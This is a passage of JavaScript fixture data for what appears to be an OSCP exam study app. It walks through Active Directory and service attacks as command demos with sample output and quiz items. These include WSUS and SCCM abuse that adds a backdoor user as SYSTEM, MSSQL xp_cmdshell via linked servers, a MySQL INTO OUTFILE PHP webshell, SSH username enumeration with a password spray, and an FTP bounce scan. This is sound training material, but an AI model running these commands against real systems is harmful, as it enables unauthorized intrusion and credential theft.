      {"t":"Stage a malicious update","d":"SharpWSUS crafts an update that runs a command as SYSTEM.","demo":[{"run":"SharpWSUS.exe create /payload:\"C:\\Temp\\psexec.exe\" /args:\"-accepteula -s cmd.exe /c net user hacker P@ss123! /add\" /title:\"Critical Update\"","out":"[*] Update created: UpdateID a1b2c3\n[*] Approve it for the target group","sig":"Update created"}],"note":"The crafted update is ready to approve for the victim clients."},
      {"t":"Approve and wait for check-in","d":"Approving the update for a target group pushes it on the next poll.","demo":[{"run":"SharpWSUS.exe approve /updateid:a1b2c3 /computername:WS01 /groupname:\"Pwned\"","out":"[*] Update approved for WS01\n[*] Client will execute it as SYSTEM on next check-in","sig":"execute it as SYSTEM on next check-in"}],"note":"Each client that polls runs your update as SYSTEM; one server, the whole fleet."}]},
    "sccm-enum": {"lead":"Enumerate SCCM for Network Access Accounts and management points; full takeover pushes code as SYSTEM fleet-wide.","items":[
      {"t":"Find the SCCM site","d":"sccmhunter locates the management point and site server.","demo":[{"run":"sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10","out":"[+] Found Management Point: sccm.acme.internal\n[+] Site Code: ACM","sig":"Found Management Point"}],"note":"The management point and site code anchor every later SCCM attack."},
      {"t":"Recover the Network Access Account","d":"The NAA creds are retrievable and often over-privileged.","demo":[{"run":"sccmhunter http -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10","out":"[+] Recovered NAA: acme\\svc_sccm:SCCMNaa#2026","sig":"svc_sccm:SCCMNaa#2026"}],"note":"A leaked Network Access Account is a credential to reuse right away."},
      {"t":"Push code with SharpSCCM (takeover)","d":"With the right rights, SCCM deploys a program to run as SYSTEM on a named client.","demo":[{"run":"SharpSCCM.exe exec -d WS01 -p \"cmd.exe /c net user hacker P@ss123! /add\"","out":"[+] Deployment created; WS01 will run it as SYSTEM","sig":"run it as SYSTEM"}],"note":"Takeover means code execution as SYSTEM across every managed machine (-d names the device; -r takes a numeric ResourceId)."}]}
  };
  Object.keys(AD4_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = AD4_HOW[k]; });

  var AD4_PRACTICE = {
    "lateral-exec": {situation:"nxc shows Pwn3d! on WEB01, which is monitored. Which execution tool fits?", choices:["lateral-exec","dump-secrets","ticket-reuse","dcsync"], coach:{"dump-secrets":"That comes after you have a session; first you need execution, and on a monitored box a quiet one like wmiexec.","ticket-reuse":"No ticket involved here, you hold a password or hash; lateral-exec picks the execution tool.","dcsync":"Needs a DC and replication rights; this is lateral movement to a member server."}},
    "ticket-reuse": {situation:"You dumped a .ccache for Administrator from LSASS and want to act as them with no password. On Linux, what do you do?", choices:["ticket-reuse","kerberos-tickets","lateral-exec","dump-secrets"], coach:{"kerberos-tickets":"That is the hygiene that makes tickets work (clock and KRB5CCNAME); reusing the ticket is the actual move, built on that hygiene.","lateral-exec":"That uses a password or hash; here you hold a ticket, so pass it with -k instead.","dump-secrets":"Already done, that produced the ticket; now reuse it."}},
    "dump-secrets": {situation:"You just became local admin on a member server. What is the reflexive next move?", choices:["dump-secrets","dcsync","lateral-exec","own-domain-pth"], coach:{"dcsync":"That needs a DC and replication rights; on a member server, dump its local SAM and LSASS first.","lateral-exec":"You already have admin here; dumping its secrets is what feeds the next lateral move.","own-domain-pth":"The endgame once you hold the domain's hashes; you are on one member server, so dump it first."}},
    "dcsync": {situation:"An ACL abuse just granted your user DS-Replication-Get-Changes-All on the domain. What does that unlock?", choices:["dcsync","dump-secrets","golden-ticket","own-domain-pth"], coach:{"dump-secrets":"On a DC that is the -just-dc path, which is exactly DCSync; here the specific technique is DCSync via your new replication right.","golden-ticket":"That comes after, using the krbtgt hash DCSync returns; first replicate the hashes.","own-domain-pth":"The endgame once you have Administrator's hash; DCSync is how you get it."}},
    "own-domain-pth": {situation:"DCSync handed you the built-in Administrator's NT hash. What is the final step, and why no cracking?", choices:["own-domain-pth","crack-tgs","golden-ticket","lateral-exec"], coach:{"crack-tgs":"No cracking needed, the hash authenticates directly; that mode is for roasted service tickets anyway.","golden-ticket":"Persistence you could add, but to prove the domain now, just pass the Administrator hash.","lateral-exec":"Same mechanism (pass-the-hash), but this is the endgame on the DC itself, not lateral movement."}},
    "sid-history-abuse": {situation:"You own acme.internal (krbtgt in hand) and it sits in a forest with a root domain. How do you escalate to the whole forest?", choices:["sid-history-abuse","golden-ticket","trust-enum","dcsync"], coach:{"golden-ticket":"That persists in the domain you already own; crossing to the forest root needs an injected root SID, which is SID history.","trust-enum":"That is how you found the trust; exploiting it to climb needs the extra-SID injection.","dcsync":"That dumps the current domain; to DCSync the root you first forge a ticket carrying its privileged SID."}},
    "zerologon-check": {situation:"You suspect a DC might be vulnerable to Zerologon. What do you run first, and why not the exploit?", choices:["zerologon-check","zerologon-exploit","dump-secrets","eternalblue"], coach:{"zerologon-exploit":"That is destructive (it empties the DC's machine password); confirm vulnerability with the harmless check first.","dump-secrets":"Needs admin you do not have yet; the Zerologon check is credential-free and safe.","eternalblue":"A different CVE (SMBv1 RCE); the Zerologon check tests the Netlogon flaw specifically."}},
    "zerologon-exploit": {situation:"The Zerologon check says VULNERABLE and you are ready to exploit. What must you absolutely do as part of the attack?", choices:["zerologon-exploit","dcsync","own-domain-pth","dump-secrets"], coach:{"dcsync":"It is the middle of this exploit (dump with the empty password), but the exploit also requires restoring the machine password afterward.","own-domain-pth":"The payoff once you have the hashes, but Zerologon specifically leaves the DC broken until you restore its password.","dump-secrets":"One step of it; the point here is the full destructive-and-restore sequence, you must put the original machine hash back."}},
    "eternalblue": {situation:"nmap's smb-vuln-ms17-010 reports VULNERABLE on an old Windows box and you have no credentials. What does that enable?", choices:["eternalblue","lateral-exec","zerologon-exploit","dump-secrets"], coach:{"lateral-exec":"That needs valid admin creds; EternalBlue is unauthenticated RCE, exactly what a VULNERABLE MS17-010 gives you.","zerologon-exploit":"A different CVE against a DC's Netlogon; MS17-010 is an SMBv1 RCE on this host.","dump-secrets":"Comes after you have SYSTEM; EternalBlue is how you get it here, with no creds."}},
    "nopac": {situation:"You have a plain domain user and the DC is missing CVE-2021-42278/42287. What is the fastest path to Domain Admin?", choices:["nopac","kerberoast","ad-acl-abuse","dcsync"], coach:{"kerberoast":"A slower, luck-based path (needs a crackable service account); noPac is a direct patch-gap escalation when the DC is unpatched.","ad-acl-abuse":"The grind noPac lets you skip; when the DC is unpatched, noPac is the straight line.","dcsync":"Needs rights you do not have; noPac is how you get them here, by impersonating a privileged account."}},
    "printnightmare": {situation:"You have a domain credential and find the Print Spooler running on a target. What reliable route to SYSTEM does that open?", choices:["printnightmare","eternalblue","nopac","lateral-exec"], coach:{"eternalblue":"A different service (SMBv1) and unauthenticated; PrintNightmare abuses the running Spooler with your credential.","nopac":"A DC patch-gap escalation; PrintNightmare is the Spooler-DLL route, which fits any host running Spooler.","lateral-exec":"Needs admin you may not have; PrintNightmare turns a plain credential plus a running Spooler into SYSTEM."}},
    "ms14-068": {situation:"You land a low-priv credential against a Windows Server 2008 R2 domain controller. What quick, legacy check is worth trying before harder paths?", choices:["ms14-068","nopac","kerberoast","adcs-esc"], coach:{"nopac":"That targets a newer patch gap (2021 CVEs); on a 2008 R2 DC, MS14-068 is the ancient-but-trivial one to try.","kerberoast":"Slower and luck-based; on a DC this old, MS14-068 can take a basic user straight to DA in one command.","adcs-esc":"Needs a CA and is a modern path; the legacy quick win on an old DC is MS14-068."}},
    "gpo-abuse": {situation:"BloodHound shows you hold GenericWrite over a GPO linked to the servers OU. What does that get you?", choices:["gpo-abuse","ad-acl-abuse","dnsadmins-abuse","lateral-exec"], coach:{"ad-acl-abuse":"The general family; the specific, high-impact cash-in of GPO write is pushing a task or admin membership fleet-wide.","dnsadmins-abuse":"A different DC-SYSTEM path (the DNS service DLL); this edge is GPO write, which hits every machine in scope.","lateral-exec":"That needs creds for a host; GPO abuse hands you local admin on every machine the policy reaches."}},
    "dnsadmins-abuse": {situation:"You discover your account is a member of DnsAdmins. Why does that matter, and how do you abuse it?", choices:["dnsadmins-abuse","gpo-abuse","ad-acl-abuse","lateral-exec"], coach:{"gpo-abuse":"A different SYSTEM-everywhere path; DnsAdmins specifically gets you SYSTEM on the DC via the DNS plugin DLL.","ad-acl-abuse":"The general family; DnsAdmins membership is the specific, well-known DC privesc via ServerLevelPluginDll.","lateral-exec":"Needs admin creds; DnsAdmins turns a group membership into SYSTEM on the DC without them."}},
    "wsus-abuse": {situation:"Clients point at http://wsus.acme.internal:8530 (cleartext) and you can position between them and the server. What does that enable?", choices:["wsus-abuse","sccm-enum","gpo-abuse","printnightmare"], coach:{"sccm-enum":"A different management system; WSUS on cleartext HTTP is specifically MITM-able into SYSTEM on clients.","gpo-abuse":"Needs a writable GPO; WSUS abuse needs a MITM position on a cleartext update channel instead.","printnightmare":"A Spooler-DLL route; the WSUS finding is a fake-update route to SYSTEM across every client that checks in."}},
    "sccm-enum": {situation:"You find an SCCM management point with only a low-priv credential. What is worth doing even short of full takeover?", choices:["sccm-enum","wsus-abuse","dcsync","kerberoast"], coach:{"wsus-abuse":"A different update system; SCCM enumeration specifically leaks the Network Access Account and management-point data.","dcsync":"Needs replication rights; enumerating SCCM may leak a credential that gets you closer first.","kerberoast":"Unrelated; SCCM enumeration pulls the NAA and site data directly, often a credential outright."}}
  };
  Object.keys(AD4_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = AD4_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === PROOF LANE ================================================================================
  var PROOF_LEADUPS = {
    "flag-hunt-linux": [
      { key: "shell", label: "You have a shell at the needed level", steps: [
        { title: "You hold the access the flag needs", tool: "ssh", where: "host", cmd: "id", out: "uid=0(root) gid=0(root) groups=0(root)", sig: "uid=0(root)", teach: "A root shell reads root.txt, a user shell reads user.txt; capture the flag in a session you can screenshot." } ] },
    ],
    "flag-hunt-windows": [
      { key: "shell", label: "You have Windows access at the needed level", steps: [
        { title: "You hold the required Windows access", tool: "evil-winrm", where: "host", cmd: "whoami", out: "nt authority\\system", sig: "nt authority\\system", teach: "SYSTEM or Administrator reads proof.txt, the low-priv user reads user.txt; screenshot the capture." } ] },
    ]
  };
  Object.keys(PROOF_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = PROOF_LEADUPS[k]; });

  var PROOF_HOW = {
    "flag-hunt-linux": {"lead":"Find the flag files, read them, and capture proof: the flag next to your id, hostname, and IP in one screenshot.","items":[
      {"t":"Locate the flags","d":"A scoped find turns up user.txt, root.txt, or proof.txt anywhere on the box.","demo":[{"run":"find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null","out":"/home/bob/user.txt\n/root/root.txt","sig":"/root/root.txt"}],"note":"user.txt in a home, root.txt under /root; read whichever your access allows."},
      {"t":"Read with proof context","d":"Print the flag alongside your identity and the host so one screenshot proves it.","demo":[{"run":"hostname && id && ip -4 addr show eth0 | grep inet && cat /root/root.txt","out":"target\nuid=0(root) gid=0(root) groups=0(root)\n    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0\nc1d9f4a70b2e85d3f6a1c0b7e2d84a59","sig":"c1d9f4a70b2e85d3f6a1c0b7e2d84a59"}],"note":"Flag, whoami, hostname, and IP in one frame, which is what OffSec scores."},
      {"t":"Avoid the zero-score trap","d":"A flag read remotely with no session context scores nothing; always show your access.","demo":[{"run":"sshpass -p 'Autumn2026!' ssh bob@10.10.10.10 'cat /home/bob/user.txt'","out":"b7e2c1f94a8d60e35f2a1c7b9d04e8a6","sig":"b7e2c1f94a8d60e35f2a1c7b9d04e8a6"}],"note":"This string alone is not proof; re-read it inside an interactive shell you screenshot."}]},
    "flag-hunt-windows": {"lead":"Read the flag next to whoami, hostname, and ipconfig so a single screenshot proves the compromise.","items":[
      {"t":"Read with proof context","d":"Print the flag beside your identity and the host in one shell.","demo":[{"run":"whoami & hostname & ipconfig | findstr IPv4 & type C:\\Users\\Administrator\\Desktop\\proof.txt","out":"nt authority\\system\nDC01\n   IPv4 Address. . . . . . . . : 10.10.10.10\na1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","sig":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"}],"note":"Flag, whoami, hostname, and IP in one frame; that is the exam screenshot."},
      {"t":"Find the user flag","d":"user.txt sits on the low-priv user's Desktop.","demo":[{"run":"type C:\\Users\\bob\\Desktop\\user.txt","out":"9f3c7a1e5b2d8f04a6c1e9b3d7f2a5c8","sig":"9f3c7a1e5b2d8f04a6c1e9b3d7f2a5c8"}],"note":"Grab user.txt before you escalate, in case the privesc is unstable."},
      {"t":"Spider for flags remotely","d":"When you only have creds, nxc can locate the flag files over SMB.","demo":[{"run":"nxc smb 10.10.10.10 -u administrator -H 31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c --spider C$ --regex \"(proof|user|root)\\.txt\"","out":"SPIDER  C$\\Users\\Administrator\\Desktop\\proof.txt [lastm:'2026-01-02' size:34]","sig":"proof.txt"}],"note":"Finds the file, but still read it in an interactive session for a scoreable screenshot."}]}
  };
  Object.keys(PROOF_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = PROOF_HOW[k]; });

  var PROOF_PRACTICE = {
    "flag-hunt-linux": {situation:"You have a root shell on the target and the engagement needs the root flag. What proves the capture on the exam?", choices:["flag-hunt-linux","linux-enum","dump-secrets","flag-hunt-windows"], coach:{"linux-enum":"That is how you got here; now capture the flag with proof context, not more enumeration.","dump-secrets":"Irrelevant to proof; you need the flag read in a screenshot showing your access.","flag-hunt-windows":"Wrong platform; this is a Linux box, so read user.txt/root.txt with your id and IP visible."}},
    "flag-hunt-windows": {situation:"You have a SYSTEM shell on a Windows DC and need the proof flag. What captures it for the exam?", choices:["flag-hunt-windows","own-domain-pth","flag-hunt-linux","windows-enum"], coach:{"own-domain-pth":"That is how you reached SYSTEM; now capture proof.txt with whoami and ipconfig visible.","flag-hunt-linux":"Wrong platform; on Windows read proof.txt/user.txt from the Desktops, next to ipconfig.","windows-enum":"Enumeration is done, you are SYSTEM; the remaining step is the proof screenshot."}}
  };
  Object.keys(PROOF_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = PROOF_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // --- Phase-3 decision-map gap-fill modules (see docs/DECISION-MAP.md): six services whose
  // standard OSCP technique had no module. Full fixtures incl. the Your-turn practice inline. ---
  var GAPFILL = {
    'mssql-linked-server': {
      why: "A SQL Server login is rarely the prize by itself; its real value is that SQL Server trusts other SQL Servers. A linked server is a saved connection one instance keeps to another, often with a stored login, and often to a box you cannot reach directly. If the login configured on that link is higher privileged than you are, you hop: run queries on the far instance, and where the link maps to a sysadmin, re-enable and call xp_cmdshell for OS command execution on that host. This is the quiet route from a low-privilege MSSQL login on one machine to code execution as a service account on another. Check your own role first, then map the trusts, because the link is often the only way onward.",
      cmd: "SELECT name, is_linked FROM sys.servers",
      tool: "mssqlclient",
      output: "name              is_linked\n---------------   ---------\nDC01\\SQLEXPRESS   0\nSQL02             1",
      signal: "SQL02             1",
      teach: "SQL02 is a linked server (is_linked = 1), a trust this box keeps to another instance. Query through it with OPENQUERY or EXEC AT, and if your link login is sysadmin over there, turn on xp_cmdshell on SQL02 for code execution on that host.",
      leadup: [
        { key: "session", label: "You have a SQL session", steps: [
          { title: "Log in to the database", tool: "mssqlclient", where: "local", cmd: "mssqlclient.py acme.internal/svc_sql:<password>@<target> -windows-auth", out: "[*] ENVCHANGE(DATABASE): master\nSQL (svc_sql  dbo@master)> ", sig: "SQL (svc_sql  dbo@master)> ", teach: "You hold a session as svc_sql, but the prompt does not tell you your privilege; check your role before assuming xp_cmdshell is available." } ] },
        { key: "role", label: "You checked your role", steps: [
          { title: "Am I sysadmin here?", tool: "mssqlclient", where: "target", cmd: "SELECT IS_SRVROLEMEMBER('sysadmin')", out: "-----------\n0", sig: "-----------\n0", teach: "A zero means you are not sysadmin on this instance, so xp_cmdshell is off limits here. The linked server is how you get a higher-privileged context." } ] }
      ],
      how: { lead: "Linked servers are a four-step hop: map the trust, see who the link logs in as, impersonate if you can, then run commands on the far box.", items: [
        { t: "Map the trust", d: "List the instances this server links to. sys.servers (or the older sp_linkedservers) names each linked instance and marks it is_linked.", demo: [ { run: "SELECT name, is_linked FROM sys.servers", out: "name    is_linked\nSQL02   1", sig: "SQL02   1" } ], note: "Any row with is_linked = 1 is a connection you can run queries through." },
        { t: "See who the link logs in as", d: "Run a query AT the linked server to read its identity and role. A link that lands as a sysadmin on the far instance is the whole game.", demo: [ { run: "EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [SQL02]", out: "sa    1", sig: "sa    1" } ], note: "sa with a 1 means your queries run as sysadmin on SQL02, even though you are low-privilege here." },
        { t: "Impersonate locally when a link is not available", d: "If you can impersonate a higher login on this box, EXECUTE AS LOGIN switches your context. sys.server_permissions lists who you may impersonate.", demo: [ { run: "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER", out: "sa", sig: "sa" } ], note: "REVERT drops back; this is the single-box version of the same privilege jump." },
        { t: "Turn the hop into a shell", d: "On a sysadmin context, enable xp_cmdshell and run a command. Through a link, wrap it in EXEC (...) AT so it runs on the far instance.", demo: [ { run: "EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [SQL02]", out: "nt service\\mssqlserver", sig: "nt service\\mssqlserver" } ], note: "The far instance ran whoami as its service account; that is command execution on SQL02." }
      ] },
      situation: "You have a SQL session on 10.10.10.10 but your login is not sysadmin, and sys.servers lists a linked server SQL02. What is the move?",
      choices: ["mssql-linked-server", "mssql-xp-cmdshell", "mssql-login", "crack-identify"],
      coach: { "mssql-xp-cmdshell": "You are not sysadmin on this box, so xp_cmdshell is blocked here; hop to the linked SQL02, where your link login may be sysadmin.", "mssql-login": "You already have a session; the next step is abusing the trust to SQL02, not logging in again.", "crack-identify": "You have no hash to crack; the path forward is the linked-server trust, not cracking." }
    },
  
    'mysql-outfile-rce': {
      why: "A MySQL login is often treated as a loot stop, but with two conditions it is a shell. First the account needs the FILE privilege; second secure_file_priv must be empty or point somewhere useful, and you need a directory the web server both serves and lets MySQL write. When those hold, SELECT INTO OUTFILE drops a small PHP file into the web root and you call it over HTTP for command execution. When the web root is not writable but the plugin directory is, the UDF route loads lib_mysqludf_sys and gives you sys_exec instead. INTO OUTFILE is the cleaner exam route, so check your privileges first and reach for it before anything exotic.",
      cmd: "curl 'http://10.10.10.10/sh.php?c=id'",
      tool: "curl",
      output: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
      signal: "uid=33(www-data)",
      teach: "The PHP file you wrote through the database ran id as www-data. You have command execution in the web context now; upgrade it to a reverse shell before the session drops.",
      leadup: [
        { key: "session", label: "You have a MySQL session", steps: [
          { title: "Log in to MySQL", tool: "mysql", where: "local", cmd: "mysql -h <target> -u webapp -p<password>", out: "Welcome to the MariaDB monitor.\nMariaDB [(none)]> ", sig: "MariaDB [(none)]> ", teach: "You hold a session; before looting, check whether this account can write files, because that is the difference between data and a shell." } ] },
        { key: "filepriv", label: "You confirmed the FILE privilege", steps: [
          { title: "Can this account write files?", tool: "mysql", where: "target", cmd: "SHOW GRANTS FOR CURRENT_USER()", out: "GRANT SELECT, FILE ON *.* TO `webapp`@`%`", sig: "FILE", teach: "FILE in the grants means INTO OUTFILE is available. Confirm secure_file_priv is empty next, then write to the web root." } ] }
      ],
      how: { lead: "INTO OUTFILE is three checks and a write: confirm FILE privilege, confirm you can write where the web server reads, write the shell, then call it.", items: [
        { t: "Confirm you can write files", d: "The account needs the FILE privilege and secure_file_priv must not fence you out. Read both before trying.", demo: [ { run: "SELECT @@secure_file_priv; SHOW GRANTS FOR CURRENT_USER()", out: "@@secure_file_priv\n\nGRANT SELECT, FILE ON *.* TO `webapp`@`%`", sig: "GRANT SELECT, FILE ON" } ], note: "An empty secure_file_priv plus FILE means you can write anywhere MySQL's user can, including the web root." },
        { t: "Find a writable web root", d: "You need a directory the web server serves and the mysql user can write. /var/www/html is the common default; confirm the app is served from there.", demo: [ { run: "curl -s http://<target>/ -I", out: "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)", sig: "Server: Apache/2.4.41 (Ubuntu)" } ], note: "An Ubuntu Apache almost always serves /var/www/html; a Windows IIS target points at C:\\inetpub\\wwwroot instead." },
        { t: "Write the webshell", d: "SELECT a PHP one-liner INTO OUTFILE in the web root. A single row is enough.", demo: [ { run: "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php'", out: "Query OK, 1 row affected (0.001 sec)", sig: "Query OK, 1 row affected" } ], note: "If this errors with Errcode 13, the directory is not writable; fall back to the UDF route or another path." },
        { t: "The UDF fallback", d: "When the web root is not writable but the plugin directory is, load lib_mysqludf_sys and define sys_exec for direct command execution from SQL.", demo: [ { run: "CREATE FUNCTION sys_exec RETURNING INT SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id > /tmp/o')", out: "Query OK, 0 rows affected", sig: "Query OK, 0 rows affected" } ], note: "UDF runs as the mysql service account, which is sometimes root on older setups, a privilege bonus over the webshell." }
      ] },
      situation: "You have a MySQL session on 10.10.10.10 and SHOW GRANTS lists the FILE privilege. What turns this into a shell?",
      choices: ["mysql-outfile-rce", "mysql-loot", "mysql-login", "file-upload"],
      coach: { "mysql-loot": "Looting hashes is worth doing, but FILE privilege lets you skip straight to code execution by writing a webshell.", "mysql-login": "You already have the session; now use its FILE privilege to write a shell.", "file-upload": "That is a web-form technique; here your write primitive is the database itself through INTO OUTFILE." }
    },
  
    'ssh-user-enum': {
      why: "SSH gives no code execution by itself, so it is easy to write off, but a pre-7.7 OpenSSH leaks which usernames exist. When you send a malformed public-key authentication request, a vulnerable server takes a different path for a real user than for an invalid one, and the timing or response gives the account away. That turns a blind brute into a targeted one: enumerate the valid names first, then spray a likely password only against accounts that actually exist, which is faster and far quieter. Confirm the banner version before you start, because only OpenSSH before 7.7 is affected. The result is a clean list of real users to feed the next step.",
      cmd: "python3 cve-2018-15473.py --userList users.txt 10.10.10.10",
      tool: "python3",
      output: "[+] root is a valid user\n[-] admin is not a valid user\n[+] administrator is a valid user\n[+] j.smith is a valid user",
      signal: "[+] administrator is a valid user",
      teach: "Three names came back valid and one did not. Spray a seasonal or leaked password only against root, administrator, and j.smith, not the whole list, so you stay under the lockout and the noise floor.",
      leadup: [
        { key: "banner", label: "The banner is pre-7.7", steps: [
          { title: "Read the SSH version", tool: "nc", where: "local", cmd: "nc <target> 22", out: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8", sig: "OpenSSH_7.2p2", teach: "7.2 is before 7.7, so CVE-2018-15473 applies. A 7.7 or newer banner means this enumeration is closed and you should brute or look elsewhere." } ] },
        { key: "names", label: "You built a candidate list", steps: [
          { title: "Gather likely usernames", tool: "sh", where: "local", cmd: "cat users.txt", out: "root\nadmin\nadministrator\nj.smith", sig: "j.smith", teach: "Seed the list from names you saw on the website, in SMTP, or in a breach wordlist; the enumeration tells you which are real." } ] }
      ],
      how: { lead: "Username enumeration is confirm the version, run the check, then act only on the valid names.", items: [
        { t: "Confirm the version is vulnerable", d: "Only OpenSSH before 7.7 leaks usernames this way. Read the banner with nc or nmap -sV before spending time on it.", demo: [ { run: "nmap -sV -p22 <target>", out: "22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu", sig: "OpenSSH 7.2p2" } ], note: "A newer banner closes this path; do not keep trying the enumeration against a patched server." },
        { t: "Run the enumeration", d: "The Metasploit ssh_enumusers module or a standalone CVE-2018-15473 script sends the malformed auth and sorts valid from invalid.", demo: [ { run: "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <target>; set USER_FILE users.txt; run; exit'", out: "[+] <target> - User 'administrator' found\n[-] <target> - User 'admin' not found", sig: "User 'administrator' found" } ], note: "Either tool is fine; the signal is the same split between found and not found." },
        { t: "Spray only the valid users", d: "A confirmed account list makes the password spray targeted. Spray one password across the valid names and watch the lockout policy.", demo: [ { run: "hydra -L valid_users.txt -p 'Autumn2024!' ssh://<target>", out: "[22][ssh] host: <target>   login: j.smith   password: Autumn2024!", sig: "login: j.smith   password: Autumn2024!" } ], note: "One hit and you have a foothold; the enumeration is what made the spray cheap enough to try." }
      ] },
      situation: "A scan shows 22/tcp running OpenSSH 7.2p2 and you have a wordlist of candidate names. What is the move?",
      choices: ["ssh-user-enum", "online-brute-ssh", "ssh-key-login", "crack-identify"],
      coach: { "online-brute-ssh": "Brute is the next step, but enumerate valid users first on this pre-7.7 OpenSSH so you only spray accounts that exist.", "ssh-key-login": "You have no private key yet; first find which users exist.", "crack-identify": "You have no hash; this is username discovery, not cracking." }
    },
  
    'smtp-open-relay': {
      why: "A mail server that relays messages for senders and recipients it does not own is an open relay, a real finding on its own and a lever for phishing or internal spoofing. It is quick to test, so it belongs in your port-25 checklist right next to username enumeration. You confirm it by offering a MAIL FROM and a RCPT TO that both sit outside the domains the server is responsible for, and watching for a 250 accept instead of a 550 refusal. This will not hand you a shell, but it is points on the report and sometimes the setup for a credential-harvesting email to a real user. Keep it separate in your head from VRFY and EXPN user enumeration, which is a different check on the same port.",
      cmd: "nmap --script smtp-open-relay -p25 10.10.10.10",
      tool: "nmap",
      output: "PORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (14/16 tests)\n|_ MAIL FROM:<antispam@example.com> -> RCPT TO:<relaytest@nmap.scanme.org>",
      signal: "Server is an open relay",
      teach: "The script relayed mail that neither came from nor was destined for this server's own domains. That is an open relay; record it as a finding, and you can use it to send spoofed internal mail to a real user.",
      leadup: [
        { key: "scan", label: "The scan found 25", steps: [
          { title: "Spot the mail service", tool: "nmap", where: "local", cmd: "nmap -p25 <target>", out: "25/tcp open  smtp", sig: "25/tcp open  smtp", teach: "Port 25 is SMTP; the two quick wins are username enumeration and the open-relay test, both costless." } ] },
        { key: "banner", label: "The banner named the server", steps: [
          { title: "Read the SMTP banner", tool: "telnet", where: "local", cmd: "telnet <target> 25", out: "220 mail.acme.internal ESMTP Postfix", sig: "220 mail.acme.internal ESMTP Postfix", teach: "The banner names the mail software and the domain it serves; the relay test uses addresses outside that domain." } ] }
      ],
      how: { lead: "Testing a relay is one scan, or a short manual conversation, then knowing what you are looking at.", items: [
        { t: "Scan it in one shot", d: "The nmap smtp-open-relay script runs sixteen relay patterns and reports whether any are accepted.", demo: [ { run: "nmap --script smtp-open-relay -p25 <target>", out: "| smtp-open-relay: Server is an open relay (14/16 tests)", sig: "Server is an open relay" } ], note: "Any accepted test is a positive; the fraction tells you how permissive the server is." },
        { t: "Prove it by hand", d: "A manual session makes the finding concrete. HELO, then a MAIL FROM and RCPT TO that are both external, and watch for a 250 on the recipient.", demo: [ { run: "swaks --to external@gmail.com --from spoof@external.net --server <target>", out: "<- 250 2.1.5 Ok\n<- 250 2.0.0 Ok: queued", sig: "250 2.1.5 Ok" } ], note: "A 250 after RCPT TO an outside address is the relay accepting; a 554 or 550 is a correctly locked server." },
        { t: "Know the difference", d: "Open relay is about forwarding mail for outsiders. VRFY and EXPN user enumeration is a separate check that confirms which local mailboxes exist. Run both, but report them as distinct findings.", note: "Confusing the two costs you marks; the relay has no credential, the user enum has no forwarding." }
      ] },
      situation: "25/tcp is open and you want to test the mail server's configuration for a reportable weakness. What confirms an open relay?",
      choices: ["smtp-open-relay", "recon-smtp", "recon-mail", "password-spray"],
      coach: { "recon-smtp": "VRFY and EXPN user enumeration is a different check; the open-relay test is about whether the server forwards mail for outsiders.", "recon-mail": "Reading a mailbox needs a credential you do not have; the relay test needs none.", "password-spray": "No credentials or user list are in play here; this is a configuration test, not an authentication attack." }
    },
  
    'ftp-bounce': {
      why: "The FTP PORT command lets a client tell the server where to open its data connection, and an old server that honors an arbitrary address will connect to a third host on your behalf. That is the FTP bounce, and its real use is scanning: you aim the server's data connection at an internal host you cannot reach directly and read which ports answer. It is niche and mostly retired, but when an engagement puts a bounce-capable FTP server in front of a segment you cannot otherwise touch, it is a free internal port scan from a position you do not normally hold. nmap automates the whole thing with the -b flag. Treat a successful bounce as a pivot-lite finding that maps the next target, not as a shell.",
      cmd: "nmap -b anonymous:anonymous@10.10.10.10 -p 3306,6379,8080 172.16.5.10",
      tool: "nmap",
      output: "Nmap scan report for 172.16.5.10\nPORT     STATE  SERVICE\n3306/tcp open   mysql\n6379/tcp closed redis\n8080/tcp open   http-proxy",
      signal: "3306/tcp open   mysql",
      teach: "The FTP server relayed the scan and reported 3306 and 8080 open on an internal host you could not reach directly. That is a map of your next target; pivot toward the services it exposed.",
      leadup: [
        { key: "anon", label: "Anonymous FTP works", steps: [
          { title: "Log in anonymously", tool: "ftp", where: "local", cmd: "ftp <target>", out: "Name (<target>): anonymous\n230 Login successful.", sig: "230 Login successful.", teach: "You must be logged in to issue PORT, and anonymous is enough; the bounce does not need a privileged account." } ] },
        { key: "port", label: "The server honors PORT", steps: [
